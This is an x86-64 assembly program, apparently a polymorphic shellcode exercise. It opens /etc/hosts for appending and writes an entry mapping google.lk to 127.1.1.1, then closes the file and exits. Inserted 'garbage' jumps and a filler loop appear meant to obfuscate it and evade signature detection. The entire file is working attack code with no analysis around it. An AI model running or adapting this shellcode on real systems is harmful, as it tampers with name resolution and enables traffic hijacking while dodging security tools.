global _start
    section .text

_start:

	jmp real_start
        text db "127.1.1.1 google.lk"   ; 19 bytes +1 from NULL
        path db "/etc/hosts", 0x00      ; 10 bytes +1 from NULL

real_start:

    ;open
    push 2
    pop rax
    ; Instead the stack for the string, use rel addressing
    lea rdi, [rel text]
    push rdi
    pop r9
    push rdi
    pop rdi
    add rdi, 19
    xor rsi, rsi
    add si, 0x401
    ; Garbage jump
    jmp some_jump_1

some_jump_2:
    syscall
	
    ; Garbage jump
    jmp some_jump_3
    nop
    ;write

    ; Garbage jump
some_jump_1:
    jmp some_jump_2
	
some_jump_3:
    push rax
    pop rdi

    push 1
    pop rax

write:
    push r9
    pop rsi

garbage_jump_2:

    push 19
    pop rdx
    syscall


    ;close
    push 3
    pop rax
    syscall

    ; Garbage
garbage_jump_3:				; Lot of garbage
    push 10				; Just a bucle
    pop rcx
garbage_jump_3_loop:
    push 60
    pop rax
    loop garbage_jump_3_loop
    ; End Garbage

    ;exit
    xor rdi, rdi
    syscall



